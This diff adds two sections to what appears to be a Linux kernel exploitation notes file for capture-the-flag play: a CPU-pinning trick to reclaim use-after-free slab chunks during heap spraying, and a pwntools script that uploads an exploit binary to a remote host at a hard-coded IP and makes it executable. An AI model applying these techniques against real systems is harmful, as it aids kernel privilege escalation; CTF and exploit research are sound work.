@@ -339,5 +339,78 @@ static struct msg_msg *alloc_msg(size_t len)
 
 
 
+## 9. bind a thread to specific cpu
+
+​	When we have caused a double-free or UAF chunk inside the kernel and we want to spray the kernel to get it back, it is useful to use `sched_setaffinity()` to bind the current thread to a specific CPU to greatly increase the possibility.
+
+​	Each CPU has its own slab cache, it can also be taken as each CPU has seperate heap. When we caused a UAF chunk inside one heap, the thread may be scheduled to another CPU when we spray the kernel. If we are lucky enough, we may anyhow get the UAF chunk. However, chances are that the chunk may get allocated by some other threads before our threads get it.
+
+​	So binding our thread to a specific CPU may significantly increase the probability to get the same chunk. The binding is done by 
+
+```c
+unsigned char __cpu_mask = 1;
+sched_setaffinity(0, 1, (cpu_set_t*)&__cpu_mask);
+```
+
+
+
+## 10. upload exploit to remote in CTF games
+
+​	Use the following python script
+
+```python
+from pwn import *
+import base64
+from tqdm import tqdm
+
+HOST = "1.13.187.152"
+PORT =  9999
+USER = "pwn"
+PW = "pwn"
+BIN = "./exp"
+
+def exec_cmd(sh, cmd):
+    sh.sendline(cmd)
+    sh.recvuntil("$ ")
+
+if __name__ == "__main__":
+    sh = remote(HOST, PORT)
+    sleep(3)
+    sh.sendline("ls")
+    with open(BIN, "rb") as f:
+        data = f.read()
+    encoded = base64.b64encode(data).decode("UTF-8")
+    sh.recvuntil("$ ")
+
+    once_size = 0x200
+    for i in tqdm(range(0, len(encoded), once_size)):
+        exec_cmd(sh, "echo \"%s\" >> /tmp/benc" % (encoded[i:i+once_size]))
+
+    exec_cmd(sh, "cat /tmp/benc | base64 -d > /tmp/exp;chmod +x /tmp/exp")
+    context.log_level='debug'
+    sh.interactive()
+```
+
+
+
+​	Basically, the script first read the exploit binary as bytes. Then encode it to base64 stream, and transmit the base64 codes to remote host using `echo`. Then decode the base64 codes using `base64 -d` in remote host to get the binary executable back.
+
+​	The transmitting usually takes a lot of time and the remote usually have a timeout, so we better make the executable as small as possible. This can be achieved using `musl-gcc`. It is a wrapper to gcc to make minimal executables.
+
+```shell
+musl-gcc -masm=intel -lpthread -O3 -static -o exp.musl exp.c kernelpwn.c
+```
+
+​	The default library of musl-gcc lacks support for `userfaultfd` syscall. Make a new header file in `/usr/include/x86_64-linux-musl/linux/userfaultfd.h` and copy the original header file `/usr/include/linux/userfaultfd.h` to it. Make the following changes to make it work
+
+```c
+//#include <linux/types.h>
+typedef unsigned long long __u64;
+typedef signed long long __s64;
+typedef char __u8;
+typedef unsigned short __u16;
+typedef unsigned int __u32;
+```
+
 
 
